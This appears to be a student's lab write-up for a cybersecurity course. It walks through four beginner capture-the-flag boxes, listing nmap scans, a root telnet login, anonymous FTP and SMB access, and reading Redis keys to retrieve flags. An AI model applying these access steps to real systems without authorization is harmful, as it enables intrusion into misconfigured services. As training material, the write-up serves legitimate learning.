# CyberLabMentorship
Continuing Studies for Rutgers CyberSecurity
All 4 Starting Point Boxes were pwned.
Meow Box: Consisted of simple tasks for basic enumeration. Via terminal, used basic commands like ping, telent and nmap to gain a foothold on the targeted system. Nmap scan showed an open tcp port running telnet. Slight brute forcing of the login led to gaining access as root. Looking through the directory with ‘ls’ finds the flag, which I ‘cat’ and get a hash.
  ping {ip}
  nmnap -sV -Pn {ip}
  telnet {ip}
  login: root
  ls
  cat flag.txt
Fawn Box: Focused on learning basic uses of the ‘ftp’ command in terminal and how to download with ‘get’ Nmap scanned revealed and open tcp port running ‘ftp’ I was able to anonymously login via ftp A quick look through the files and I discover the flag. Once downloaded with ‘get’, ‘cat’ is used and the has is revealed.
  ping {ip}
  nmnap -sV -Pn {ip}
  ftp {ip}
  username: anonymous
  enter ftp shell
  ls
  get flag.txt
  exit ftp shell
  ls
  cat flag.txt
Dancing Box: Allowed to practice accessing and transferring files through ‘SMB’. Nmap scanned revealed microsoft-ds a.k.a SMB running on an open port.  Anonymously, I was able to discover 4 shares on the target, with one allowing us to enter a shell with a password. Quick look through of 2 directories, and I download and hash the flag.txt. 
  ping {ip}
  nmap -sV -Pn {ip}
  smbclient -L {ip}
  smbclient \\\\{ip}\\Workshares
  enter smb shell
  ls
  cd Amy J.
  ls
  cd ../
  cd James P.
  ls
  get flag.txt
  exit shell
  cat flag.txt
Redeemer Box: Focus on databases, in this case: Redis. Redis was discovered to be running on an open tcp port. I connected to the server using the command ‘redis-cli -h {ip}’.  With commands ‘select’ and ‘keys *’, the flag was found and the hash downloaded.
  ping {ip}
  nmap -sV -Pn {ip}
  redis-cli -h {ip}
  info
  select 0
  keys *
  get flag
![Image](https://github.com/user-attachments/assets/d8877f94-c597-43df-a9e7-e5df22930388)
